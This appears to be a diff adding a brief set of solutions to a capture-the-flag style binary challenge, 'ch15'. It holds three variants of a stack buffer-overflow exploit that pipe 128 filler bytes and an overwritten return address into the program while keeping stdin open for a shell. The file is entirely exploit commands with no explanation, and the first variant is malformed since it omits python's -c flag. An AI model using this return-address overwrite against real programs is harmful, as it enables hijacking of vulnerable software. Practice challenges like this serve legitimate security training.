@@ -1,0 +1,16 @@
+
+1.
+
+python 'print "A" * 128 + "\x64\x84\x04\x08"' > /tmp/fresh2
+
+cat /tmp/fresh2 - | ./ch15
+
+
+2.
+
+cat <(python -c 'print "A" * 128 + "\x64\x84\x04\x08"') - | ./ch15
+
+3.
+
+(python -c "print 'A'*128+'\x64\x84\x04\x08'"; cat -) | ./ch15
+
